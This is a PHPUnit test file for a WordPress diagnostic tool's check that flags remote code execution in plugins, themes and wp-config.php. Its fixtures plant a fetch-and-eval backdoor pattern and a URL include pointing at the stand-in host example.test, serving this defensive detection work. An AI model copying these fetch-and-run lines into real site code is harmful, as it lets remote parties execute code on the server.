<?php

declare(strict_types=1);

namespace WP_Doctor\Tests\Check\Category\Security;

use PHPUnit\Framework\TestCase;
use WP_Doctor\Check\Category\Security\Remote_Code_Check;
use WP_Doctor\Check\Runs_Without_Config;
use WP_Doctor\Fs\File_Scanner;
use WP_Doctor\Report\Result;
use WP_Doctor\Tests\Support\Context_Factory;
use WP_Doctor\Tests\Support\Temp_Tree;

/**
 * The planted code is inert: every URL is under example.test, which never
 * resolves.
 */
final class Remote_Code_Check_Test extends TestCase {

	private const PLANTED = "<?php\n\$r = wp_remote_get( 'https://example.test/payload.txt' );\neval( wp_remote_retrieve_body( \$r ) );\n";

	/**
	 * @var Temp_Tree
	 */
	private $tree;

	protected function setUp(): void {
		$this->tree = new Temp_Tree();
		$this->tree->file(
			'wp-content/plugins/example/example.php',
			"<?php\n\$body = wp_remote_retrieve_body( wp_remote_get( 'https://example.test/feed' ) );\necho esc_html( \$body );\n"
			. "include __DIR__ . '/inc/http-client.php';\n"
		);
	}

	protected function tearDown(): void {
		$this->tree->remove();
	}

	/**
	 * Runs the check over the tree.
	 *
	 * @param string[] $exclude Exclude globs.
	 * @return Result
	 */
	private function run_check( array $exclude = array() ): Result {
		return ( new Remote_Code_Check() )->run( Context_Factory::for_tree( $this->tree, '', File_Scanner::DEFAULT_MAX_FILES, $exclude ) );
	}

	public function test_it_has_an_id_and_a_category_and_runs_without_the_config(): void {
		$check = new Remote_Code_Check();

		$this->assertSame( 'sec.code.remotefetch', $check->id() );
		$this->assertSame( 'security', $check->category() );
		$this->assertInstanceOf( Runs_Without_Config::class, $check );
	}

	public function test_a_site_that_fetches_and_includes_but_never_runs_what_it_fetches_passes(): void {
		$this->assertTrue( $this->run_check()->is_pass() );
	}

	public function test_code_that_runs_a_download_is_a_likely_critical_with_the_file_and_line(): void {
		$this->tree->file( 'wp-content/themes/example/functions.php', self::PLANTED );

		$finding = $this->run_check()->finding_list()[0];

		$evidence = $finding->evidence();
		$this->assertSame( 'critical', $finding->severity()->name() );
		$this->assertStringContainsString( 'likely', $finding->title() );
		$this->assertSame( 4, $evidence['php_files_examined'] );
		$this->assertSame( 'wp-content/themes/example/functions.php', $evidence['file_1'] );
		$this->assertSame( 3, $evidence['file_1_line'] );
		$this->assertSame( 'eval() of wp_remote_retrieve_body(), wp_remote_get()', $evidence['file_1_code'] );
	}

	public function test_an_include_of_a_url_in_wp_config_is_reported(): void {
		$this->tree->file( 'wp-config.php', "<?php\n\$table_prefix = 'wptest_';\ninclude 'http://example.test/x.txt';\n" );

		$evidence = $this->run_check()->finding_list()[0]->evidence();

		$this->assertSame( 'wp-config.php', $evidence['file_1'] );
		$this->assertSame( 'include of a URL', $evidence['file_1_code'] );
	}

	public function test_a_clean_scan_that_did_not_see_every_file_is_a_skip_with_the_reason(): void {
		$this->tree->sparse_file( 'wp-content/plugins/example/big.php', File_Scanner::DEFAULT_MAX_BYTES + 1 );

		$result = $this->run_check();

		$this->assertSame( Result::SKIPPED, $result->status() );
		$this->assertStringContainsString( 'read only in part', (string) $result->message() );
	}

	public function test_a_site_with_every_file_excluded_has_nothing_to_examine(): void {
		$result = $this->run_check( array( '**' ) );

		$this->assertSame( Result::SKIPPED, $result->status() );
		$this->assertStringContainsString( 'nothing to examine', (string) $result->message() );
	}
}
